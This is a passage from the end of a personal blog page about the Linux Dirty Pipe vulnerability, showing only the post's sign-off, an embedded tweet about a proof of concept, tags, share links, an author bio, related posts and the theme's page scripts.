3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*QiOVCmqimzg3FZntsEGXcA.png" alt="" width="700" height="155" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="17e7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">That’s it for today. see you in another post.</p><figure class="yq yr ys yt yu yv"><div class="ca ja l dj"><div class="anb kt l"><div class="post__iframe"><iframe loading="lazy" width="680" height="560" src="https://cdn.embedly.com/widgets/media.html?type=text%2Fhtml&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;schema=twitter&amp;url=https%3A//twitter.com/bl4sty/status/1500812285358530561&amp;image=https%3A//i.embed.ly/1/image%3Furl%3Dhttps%253A%252F%252Fabs.twimg.com%252Ferrors%252Flogo46x38.png%26key%3Da19fcc184b9711e1b4764040d3dc5c07" allowfullscreen="allowfullscreen" frameborder="0" title="blasty on Twitter: &quot;Dirty Pipe PoC (https://t.co/ql5Y8pWDBj) works beautifully. 🤑 pic.twitter.com/OrRYJE5skC / Twitter&quot;" class="fd n kh di bg" scrolling="no" data-mce-fragment="1"></iframe></div></div></div></figure><p id="2648" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The End.</p></div><footer><p class="post__last-updated">This article was updated on August 19, 2023</p><div class="post__tags-share"><ul class="post__tag"><li><a href="https://sakibulalikhan.github.io/tags/cve/">CVE</a></li><li><a href="https://sakibulalikhan.github.io/tags/cyber-security/">Cyber Security</a></li><li><a href="https://sakibulalikhan.github.io/tags/linux/">Linux</a></li><li><a href="https://sakibulalikhan.github.io/tags/linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="https://sakibulalikhan.github.io/tags/pentesting/">Pentesting</a></li></ul><aside class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.github.io%2Fthe-dirty-pipe-vulnerability-on-linux.html" class="js-share facebook" aria-label="Share with Facebook" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#facebook"/></svg> </a><a href="https://twitter.com/share?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fthe-dirty-pipe-vulnerability-on-linux.html&amp;via=%40sakibulalikhan&amp;text=The%20Dirty%20Pipe%20Vulnerability%20On%20Linux" class="js-share twitter" aria-label="Share with Twitter" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fthe-dirty-pipe-vulnerability-on-linux.html&amp;media=https%3A%2F%2Fsakibulalikhan.github.io%2Fmedia%2Fposts%2F2%2FThe-Dirty-Pipe.jpg&amp;description=The%20Dirty%20Pipe%20Vulnerability%20On%20Linux" class="js-share pinterest" aria-label="Share with Pinterest" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#pinterest"/></svg> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fthe-dirty-pipe-vulnerability-on-linux.html" class="js-share mix" aria-label="Share with Mix" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#mix"/></svg> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fthe-dirty-pipe-vulnerability-on-linux.html" class="js-share linkedin" aria-label="Share with LinkedIn" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#linkedin"/></svg> </a><a href="https://buffer.com/add?text=The%20Dirty%20Pipe%20Vulnerability%20On%20Linux&amp;url=https%3A%2F%2Fsakibulalikhan.github.io%2Fthe-dirty-pipe-vulnerability-on-linux.html" class="js-share buffer" aria-label="Share with Buffer" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#buffer"/></svg> </a><a href="https://api.whatsapp.com/send?text=The%20Dirty%20Pipe%20Vulnerability%20On%20Linux https%3A%2F%2Fsakibulalikhan.github.io%2Fthe-dirty-pipe-vulnerability-on-linux.html" class="js-share whatsapp" aria-label="Share with WhatsApp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#whatsapp"/></svg></a></aside></div><div class="post__bio bio"><img src="https://sakibulalikhan.github.io/media/website/avatar.jpg" loading="lazy" height="431" width="343" class="bio__avatar" alt="Sakibul Ali Khan"><div><h3 class="h6 bio__name"><a href="https://sakibulalikhan.github.io/authors/sakibulalikhan/" class="invert" title="Sakibul Ali Khan">Sakibul Ali Khan</a></h3><div class="bio__desc"><p>Currently I’m a student and I love computers. I love programming and playing with technology. I am highly interested in cyber security.</p></div></div></div><nav class="post__nav"><div class="post__nav__prev"><a class="post__nav__link" href="https://sakibulalikhan.github.io/tryhackme-writeup-vulnnet-internal.html" rel="prev">Previous Post<h3 class="h6">TryHackMe Writeup — VulnNet Internal</h3></a></div><div class="post__nav__next"><a class="post__nav__link" href="https://sakibulalikhan.github.io/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html" rel="prev">Next Post<h3 class="h6">How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux</h3></a></div></nav></footer></div></article></div><div class="post__related"><div class="wrapper"><h2 class="h5">Related posts</h2><div class="l-grid l-grid--4"><article class="c-card"><a href="https://sakibulalikhan.github.io/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/3/Charge-Threshold.jpg" srcset="https://sakibulalikhan.github.io/media/posts/3/responsive/Charge-Threshold-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/3/responsive/Charge-Threshold-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/3/responsive/Charge-Threshold-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/3/responsive/Charge-Threshold-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="266" width="474" alt="How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/linux/">Linux</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html" class="invert">How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:04">August 19, 2023</time></footer></div></article></div></div></div></main><footer class="footer"><div class="footer__social"><a href="https://twitter.com/sakibulalikhan" aria-label="Twitter" class="twitter"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://www.linkedin.com/in/sakibulalikhan/" aria-label="LinkedIn" class="linkedin"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#linkedin"/></svg></a></div><div class="footer__copyright">Sakibul Ali Khan • 2023 • sakibulalikhan.github.io</div></footer><script>window.publiiThemeMenuConfig = {    
      mobileMenuMode: 'sidebar',
      animationSpeed: 300,
      submenuWidth: 'auto',
      doubleClickTime: 500,
      mobileMenuExpandableSubmenus: true, 
      relatedContainerForOverlayMenuSelector: '.navbar',
   };</script><script defer="defer" src="https://sakibulalikhan.github.io/assets/js/scripts.min.js?v=66112a161d5939d966ce2b20c13988d9"></script><script>var images = document.querySelectorAll('img[loading]');

      for (var i = 0; i < images.length; i++) {
         if (images[i].complete) {
               images[i].classList.add('is-loaded');
         } else {
               images[i].addEventListener('load', function () {
                  this.classList.add('is-loaded');
               }, false);
         }
      }</script></body></html>